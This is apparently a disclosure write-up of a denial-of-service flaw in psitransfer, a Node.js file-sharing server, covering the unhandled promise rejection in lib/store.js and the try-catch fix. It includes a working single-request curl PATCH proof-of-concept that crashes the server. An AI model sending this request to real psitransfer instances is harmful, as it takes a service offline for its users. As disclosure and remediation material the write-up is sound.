---
title: "Denial of Service (DoS) at psitransfer"
description: "Analysis of a Denial of Service (DoS) vulnerability in psitransfer caused by improper exception handling in file upload logic."
date: 2026-02-05
tags:
  - "psitransfer"
  - "DoS"
  - "Vulnerability Analysis"
  - "Node.js"
authors:
  - "bx"
draft: false
slug: "dos-at-psitransfer"
---

[Build software better, together](https://github.com/psi-4ward/psitransfer/security/advisories/GHSA-7hc3-jppp-9rcr)

## Summary

A Denial of Service (DoS) vulnerability exists in `psitransfer` due to an improper exception handling in the file upload logic. An unauthenticated attacker can crash the server by sending a specific HTTP `PATCH` request, which triggers an unhandled promise rejection in `lib/store.js`.

## Details

The vulnerability is located in `lib/store.js`. When the server processes an upload via the `tus` protocol, it listens for the `finish` event on the write stream. Inside this event listener, it attempts to retrieve file metadata using `this.info(fid)`.

If a `PATCH` request is sent for a file ID that hasn't been initialized (e.g., via a preceding `POST` request), the `this.info(fid)` method throws a `404 Not Found` error. Since this logic is wrapped inside an `async` event handler without a `try-catch` block, the error becomes an `UnhandledPromiseRejection`. This causes the entire Node.js process to terminate immediately, resulting in a denial of service.

**Vulnerable Code (`lib/store.js`):**

```javascript
ws.on('finish', async () => {
  // ...
  // specific logic
  const info = await this.info(fid); // <--- Throws error if file doesn't exist
  // ...
});
```

## PoC

You can reproduce this vulnerability by sending a single `PATCH` request to a running PsiTransfer instance using `curl`.

1. **Start the server**:

```bash
npm start
```

2. **Run the exploit**:

```bash
curl -X PATCH http://localhost:3000/files/crash_test_poc \
  -d "payload" \
  -H "Tus-Resumable: 1.0.0" \
  -H "Upload-Offset: 0" \
  -H "Content-Type: application/offset+octet-stream"
```

3. **Observation**: The server process crashes with `Exit code: 1` and logs:

```plain
Error: UnhandledPromiseRejection
...
NotFoundError: Not Found
    at Store.info (.../lib/store.js:...)
```

## Impact

This vulnerability allows any unauthenticated attacker (network access required) to crash the PsiTransfer server remotely with a single request. This renders the file sharing service completely unavailable until it is manually restarted by an administrator.

## Remediation

The vendor has fixed this vulnerability in the latest version. The fix involves wrapping the vulnerable async logic within a `try-catch` block to properly handle exceptions.

### Fix Analysis

In `lib/store.js`, the `append` method was modified to catch exceptions during the `finish` event handler. Previously, a failure here (like a missing file) would cause an unhandled promise rejection. The fix ensures any error is caught and passed to the promise `reject` function, preventing the process execution from crashing.

**Code Diff:**

[fix: graceful handle errors during data appending in Store · psi-4ward/psitransfer@2989bb2](https://github.com/psi-4ward/psitransfer/commit/2989bb25db7f08298b582f0c6f64579a9e9176a3)

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1770273272654-b88d8ac8-708b-4caf-9bc2-50b40204e131.png)

```diff
     const ret = new Promise((resolve, reject) => {
       ws.on('finish', async() => {
-        const info = await this.info(fid);
-        if(info.size >= info.uploadLength) delete info.isPartial;
-        await fsp.writeJson(this.getFilename(fid) + '.json', info);
-        debug(`Finished appending Data to ${this.getFilename(fid)}`);
-        return resolve({ offset: info.offset, upload: info });
+        try {
+          const info = await this.info(fid);
+          if(info.size >= info.uploadLength) delete info.isPartial;
+          await fsp.writeJson(this.getFilename(fid) + '.json', info);
+          debug(`Finished appending Data to ${this.getFilename(fid)}`);
+          return resolve({ offset: info.offset, upload: info });
+        } catch (e) {
+          return reject(e);
+        }
       });
       ws.on('error', reject);
     });
```
